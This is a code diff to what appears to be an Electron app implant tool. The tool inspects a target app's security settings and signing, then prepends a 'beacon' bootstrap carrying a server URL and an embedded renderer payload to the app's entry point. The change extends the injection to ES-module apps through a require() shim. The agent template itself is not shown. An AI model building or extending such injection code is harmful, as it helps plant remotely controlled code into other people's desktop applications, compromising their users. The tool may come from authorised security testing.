@@ -366,6 +366,23 @@ def is_minified(source_code):
     return avg_length > 200
 
 
+def detect_esm(pkg, entry_point):
+    """Detect whether the entry point uses ESM (ES Modules).
+
+    Returns True if the entry point is ESM based on:
+      - package.json "type": "module"
+      - Entry point has .mjs extension
+
+    Returns:
+        bool: True if ESM, False if CJS.
+    """
+    if entry_point and entry_point.endswith('.mjs'):
+        return True
+    if pkg.get('type') == 'module':
+        return True
+    return False
+
+
 def detect(target_path, is_asar):
     """Run detection phase — analyze the Electron app structure.
 
@@ -376,6 +393,7 @@ def detect(target_path, is_asar):
         'target': target_path,
         'is_asar': is_asar,
         'entry_point': None,
+        'is_esm': False,
         'format': None,
         'security_settings': {},
         'signing': {},
@@ -393,6 +411,9 @@ def detect(target_path, is_asar):
     # Find entry point
     entry_point = pkg.get('main', 'index.js')
     results['entry_point'] = entry_point
+
+    # Detect ESM vs CJS
+    results['is_esm'] = detect_esm(pkg, entry_point)
 
     # Read entry point source
     try:
@@ -443,6 +464,8 @@ def print_report(results):
     if results['entry_point']:
         format_note = f" ({results['format']})" if results['format'] else ''
         print(f"  Entry:   {results['entry_point']}{format_note}")
+        module_type = 'ESM' if results.get('is_esm') else 'CJS'
+        print(f"  Module:  {module_type}")
 
     settings = results.get('security_settings', {})
     if settings:
@@ -517,12 +540,16 @@ def print_report(results):
     print()
 
 
-def generate_bootstrap(server_url, tag, ipc_prefix):
+def generate_bootstrap(server_url, tag, ipc_prefix, is_esm=False):
     """Generate the bootstrap code to prepend to the entry point.
 
     Reads atom-agent.js template and embeds configuration values.
     The renderer payload (atom-telemlib.js) is embedded as a string
     constant inside the agent.
+
+    If is_esm is True, prepends an ESM shim that creates a CJS-compatible
+    require() function using import.meta.url, so the agent's require() calls
+    work in ES module entry points.
 
     Returns:
         str: The complete bootstrap code ready to prepend.
@@ -550,8 +577,16 @@ def generate_bootstrap(server_url, tag, ipc_prefix):
     agent_code = agent_code.replace("'__ATOM_IPC_PREFIX__'", f"'{ipc_prefix}'")
     agent_code = agent_code.replace("'__ATOM_RENDERER_PAYLOAD__'", telemlib_escaped)
 
+    # Build ESM shim if needed
+    esm_shim = ''
+    if is_esm:
+        esm_shim = (
+            "import { createRequire as __atomCR } from 'module';\n"
+            "const require = __atomCR(import.meta.url);\n"
+        )
+
     # Wrap in markers for detection
-    bootstrap = f"/* atom-beacon-bootstrap */\n{agent_code}\n/* end-atom-beacon-bootstrap */\n"
+    bootstrap = f"/* atom-beacon-bootstrap */\n{esm_shim}{agent_code}\n/* end-atom-beacon-bootstrap */\n"
     return bootstrap
 
 
@@ -574,6 +609,11 @@ def patch_asar(target_path, server_url, tag, backup=True, output_path=None):
     pkg = read_package_json(target_path, True)
     entry_point = pkg.get('main', 'index.js')
 
+    # Detect ESM
+    is_esm = detect_esm(pkg, entry_point)
+    if is_esm:
+        print(f"  [*] ESM entry point detected — will inject require() shim")
+
     # Read original entry file
     original_source = read_entry_file(target_path, True, entry_point)
 
@@ -583,7 +623,7 @@ def patch_asar(target_path, server_url, tag, backup=True, output_path=None):
         original_source = strip_existing_patch(original_source)
 
     # Generate bootstrap
-    bootstrap = generate_bootstrap(server_url, tag, ipc_prefix)
+    bootstrap = generate_bootstrap(server_url, tag, ipc_prefix, is_esm=is_esm)
 
     # Prepend bootstrap to entry point
     patched_source = bootstrap + original_source
@@ -620,6 +660,11 @@ def patch_directory(target_path, server_url, tag, backup=True, output_path=None)
     if not os.path.isfile(entry_file_path):
         raise FileNotFoundError(f"Entry point not found: {entry_file_path}")
 
+    # Detect ESM
+    is_esm = detect_esm(pkg, entry_point)
+    if is_esm:
+        print(f"  [*] ESM entry point detected — will inject require() shim")
+
     # Read original entry file
     with open(entry_file_path, 'r') as f:
         original_source = f.read()
@@ -630,7 +675,7 @@ def patch_directory(target_path, server_url, tag, backup=True, output_path=None)
         original_source = strip_existing_patch(original_source)
 
     # Generate bootstrap
-    bootstrap = generate_bootstrap(server_url, tag, ipc_prefix)
+    bootstrap = generate_bootstrap(server_url, tag, ipc_prefix, is_esm=is_esm)
 
     # Create backup of the entry file
     if backup:
